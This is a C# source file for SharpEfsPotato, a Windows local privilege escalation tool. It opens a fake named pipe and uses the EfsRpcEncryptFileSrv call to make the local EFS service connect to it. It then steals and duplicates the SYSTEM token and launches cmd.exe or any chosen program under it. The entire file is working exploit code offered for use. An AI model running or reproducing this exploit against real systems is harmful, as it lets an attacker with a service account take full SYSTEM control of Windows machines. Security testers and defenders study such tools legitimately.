using System;
using System.IO.Pipes;
using System.Threading;
using Mono.Options;
using System.Runtime.InteropServices;
using static SweetPotato.ImpersonationToken;

namespace SharpEfsPotato
{
    internal class EfsRpc
    {
        string pipeName = Guid.NewGuid().ToString();

        NamedPipeServerStream efsrpcPipe;
        Thread efsrpcPipeThread;
        IntPtr systemImpersonationToken = IntPtr.Zero;

        public IntPtr Token { get { return systemImpersonationToken; } }
        public bool HasToken { get { return (systemImpersonationToken != IntPtr.Zero); } }
        void EfsRpcPipeThread()
        {

            byte[] data = new byte[4];

            efsrpcPipe = new NamedPipeServerStream($"{pipeName}\\pipe\\srvsvc", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);
            efsrpcPipe.WaitForConnection();

            Console.WriteLine("[+] Server connected to our evil RPC pipe");

            efsrpcPipe.Read(data, 0, 4);

            efsrpcPipe.RunAsClient(() => {
                if (!OpenThreadToken(GetCurrentThread(),
                    TOKEN_ALL_ACCESS, false, out var tokenHandle))
                {
                    Console.WriteLine("[-] Failed to open thread token");
                    return;
                }

                if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenPrimary, out systemImpersonationToken))
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token");
                    return;
                }

                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");
            });

            efsrpcPipe.Close();
        }

        public EfsRpc()
        {
            efsrpcPipeThread = new Thread(EfsRpcPipeThread);
            efsrpcPipeThread.Start();
        }

        public void TriggerEfsRpc()
        {

            string targetPipe = string.Format($"\\\\localhost/pipe/{pipeName}/\\{pipeName}\\{pipeName}");
            //string targetPipe = string.Format($"\\\\localhost\\pipe\\{pipeName}\\pipe\\srvsvc");

            Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");

            SharpEfsTrigger.efs Efs = new SharpEfsTrigger.efs();
            Efs.EfsRpcEncryptFileSrv("localhost", targetPipe);
            //Efs.EfsRpcDecryptFileSrv("localhost", targetPipe, 0);
            // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
        }
    }
    internal class Program {

        static void PrintHelp(OptionSet options)
        {
            options.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args)
        {
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = null;
            bool showHelp = false;

            Console.WriteLine(
                "SharpEfsPotato by @bugch3ck\n" +
                "  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n" +
                "\n" +
                "  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n"
                );

            OptionSet option_set = new OptionSet()
                .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try
            {

                option_set.Parse(args);

                if (showHelp)
                {
                    PrintHelp(option_set);
                    return;
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try
            {

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);


                if (!hasImpersonate && !hasPrimary)
                {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?");
                    return;
                }

                EfsRpc efsRpc = new EfsRpc();
                Thread.Sleep(1000);
                efsRpc.TriggerEfsRpc();

                if (!efsRpc.HasToken)
                {
                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                    return;
                }
                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(efsRpc.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary))
                {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, efsRpc.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";

                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if (programArgs != null)
                    finalArgs = string.Format("\"{0}\" {1}", program, programArgs);

                    if (!CreateProcessWithTokenW(efsRpc.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi))
                    {
                        Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                        return;
                    }
                    Console.WriteLine("[+] Process created, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Failed to exploit EfsRpc: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }

        }
    }
}
